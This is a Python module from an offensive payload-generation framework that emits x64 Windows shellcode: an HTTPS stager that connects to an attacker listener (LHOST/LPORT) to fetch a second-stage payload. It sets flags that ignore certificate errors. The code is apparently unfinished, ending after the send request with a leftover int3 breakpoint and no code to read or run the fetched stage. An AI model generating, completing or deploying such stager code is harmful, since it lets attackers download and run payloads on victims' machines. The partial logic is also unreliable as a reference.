import sys
import math
import ctypes
import struct

from sickle.common.lib.generic import extract
from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ws2def,
    winternl
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) VirtualAlloc Shellcode Loader (HTTPS)"

    module = f"{platform}/{arch}/virtualalloc_exec_https"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = ("")

    description = ("")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    advanced = {}
    advanced["USER_AGENT"] = {}
    advanced["USER_AGENT"]["optional"] = "yes"
    advanced["USER_AGENT"]["description"] = "User agent to use for HTTPS communication"

    advanced["PATH"] = {}
    advanced["PATH"]["optional"] = "yes"
    advanced["PATH"]["description"] = "The HTTP path where the payload is hosted on the target server"

    advanced["REQUEST"] = {}
    advanced["REQUEST"]["optional"] = "yes"
    advanced["REQUEST"]["description"] = "The HTTP request to use when fetching the second stage"
    advanced["REQUEST"]["options"] = { "GET": "Standard GET request" }

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "VirtualAlloc",
            ],
            "wininet.dll" : [
                "InternetOpenA",
                "InternetConnectA",
                "HttpOpenRequestA",
                "InternetSetOptionA",
                "HttpSendRequestA",
                "InternetReadFile",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "caUserAgent" : self.user_agent_size,
            "caHost"      : len(self.lhost),
            "caPath"      : len(self.path),
            "caRequest"   : 0x00,
            "hInternet"   : 0x00,
            "hConnect"    : 0x00,
            "hRequest"    : 0x00,
            "dwFlags"     : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """
   
        all_args = Shellcode.arguments
        all_args.update(Shellcode.advanced)
        argv_dict = modparser.argument_check(all_args, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        # Configure the options used by the host to obtain the callback
        if "LPORT" not in argv_dict.keys():
            self.lport = 4242
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        # Set the User-Agent
        if "USER_AGENT" not in argv_dict.keys():
            self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.3485.66" 
        else:
            self.user_agent = argv_dict["USER_AGENT"]

        self.user_agent_size = len(self.user_agent)

        # Set the request type
        if "REQUEST" not in argv_dict.keys():
            self.request = hex( struct.unpack('>Q', b"GET\x00\x00\x00\x00\x00"[::-1])[0] )

        # Set the SSL flags
        self.dwSSLFlags = (0x00800000 | 0x00001000)
        self.dwFlags = (0x00000100 | 0x10000000 | 0x00000200)

        # Set the http path
        if "PATH" not in argv_dict.keys():
            self.path = "/corn"
        else:
            self.path = argv_dict["PATH"]

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        user_agent_buffer = convert.from_str_to_xwords(self.user_agent)
        write_index = self.storage_offsets['caUserAgent']

        src = ""
        for i in range(len(user_agent_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', user_agent_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(user_agent_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', user_agent_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(user_agent_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', user_agent_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(user_agent_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(user_agent_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['caUserAgent']}]\n"""

        src += f"""
    ; HINTERNET InternetOpenA([in] LPCSTR lpszAgent,        // RCX
    ;                         [in] DWORD  dwAccessType,     // RDX
    ;                         [in] LPCSTR lpszProxy,        // R8
    ;                         [in] LPCSTR lpszProxyBypass,  // R9
    ;                         [in] DWORD  dwFlags);         // RSP+0x20
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    mov [rsp + 0x20], r9
    mov rax, [rbp - {self.storage_offsets['InternetOpenA']}]
    call rax
    mov [rbp - {self.storage_offsets['hInternet']}], rax\n"""

        lhost_buffer = convert.from_str_to_xwords(self.lhost)
        write_index = self.storage_offsets['caHost']

        for i in range(len(lhost_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lhost_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lhost_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lhost_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lhost_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lhost_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lhost_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lhost_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea rdx, [rbp - {self.storage_offsets['caHost']}]\n"""

        src += f"""
    ; HINTERNET InternetConnectA([in] HINTERNET     hInternet,          // RCX
    ;                            [in] LPCSTR        lpszServerName,     // RDX
    ;                            [in] INTERNET_PORT nServerPort,        // R8
    ;                            [in] LPCSTR        lpszUserName,       // R9
    ;                            [in] LPCSTR        lpszPassword,       // RSP + 0x20 
    ;                            [in] DWORD         dwService,          // RSP + 0x28
    ;                            [in] DWORD         dwFlags,            // RSP + 0x30
    ;                            [in] DWORD_PTR     dwContext);         // RSP + 0x38
    mov rcx, [rbp - {self.storage_offsets['hInternet']}]
    mov r8, {hex(self.lport)}
    xor r9, r9
    mov [rsp + 0x20], r9
    mov r11, 0x03
    mov [rsp + 0x28], r11
    mov [rsp + 0x30], r9
    mov [rsp + 0x38], r9
    mov rax, [rbp - {self.storage_offsets['InternetConnectA']}]
    call rax
    mov [rbp - {self.storage_offsets['hConnect']}], rax\n"""

        path_buffer = convert.from_str_to_xwords(self.path)
        write_index = self.storage_offsets['caPath']

        for i in range(len(path_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', path_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(path_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', path_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(path_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', path_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(path_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(path_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea r8, [rbp - {self.storage_offsets['caPath']}]\n"""

        src += f"""
    ; HINTERNET HttpOpenRequestA([in] HINTERNET hConnect,               // RCX
    ;                            [in] LPCSTR    lpszVerb,               // RDX
    ;                            [in] LPCSTR    lpszObjectName,         // R8
    ;                            [in] LPCSTR    lpszVersion,            // R9
    ;                            [in] LPCSTR    lpszReferrer,           // RSP + 0x20
    ;                            [in] LPCSTR    *lplpszAcceptTypes,     // RSP + 0x28
    ;                            [in] DWORD     dwFlags,                // RSP + 0x30
    ;                            [in] DWORD_PTR dwContext);             // RSP + 0x38
    mov rcx, [rbp - {self.storage_offsets['hConnect']}]
    mov r11, {self.request}
    mov [rbp - {self.storage_offsets['caRequest']}], r11
    lea rdx, [rbp - {self.storage_offsets['caRequest']}]
    xor r9, r9
    mov [rsp + 0x20], r9
    mov [rsp + 0x28], r9
    mov r11, {hex(self.dwSSLFlags)}
    mov [rsp + 0x30], r11
    mov [rsp + 0x38], r9
    mov rax, [rbp - {self.storage_offsets['HttpOpenRequestA']}]
    call rax
    mov [rbp - {self.storage_offsets['hRequest']}], rax

    ; BOOL InternetSetOptionA([in] HINTERNET hInternet,       // RCX (IF SOMETHING GOES WRONG INVESTIGATE THIS CALL)
    ;                         [in] DWORD     dwOption,        // RDX
    ;                         [in] LPVOID    lpBuffer,        // R8
    ;                         [in] DWORD     dwBufferLength); // R9
    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
    mov rdx, 0x1F
    mov r11, {hex(self.dwFlags)}
    mov [rbp - {self.storage_offsets['dwFlags']}], r11
    lea r8, [rbp - {self.storage_offsets['dwFlags']}]
    mov r9, 0x04
    mov rax, [rbp - {self.storage_offsets['InternetSetOptionA']}]
    call rax

    ; BOOL HttpSendRequestA([in] HINTERNET hRequest,            // RCX
    ;                       [in] LPCSTR    lpszHeaders,         // RDX
    ;                       [in] DWORD     dwHeadersLength,     // R8
    ;                       [in] LPVOID    lpOptional,          // R9
    ;                       [in] DWORD     dwOptionalLength);   // [RSP + 0x20]
    int3
    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    mov [rsp + 0x20], r9
    mov rax, [rbp - {self.storage_offsets['HttpSendRequestA']}]
    call rax\n"""

        return src

    def get_shellcode(self):
        """Generates shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    None)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
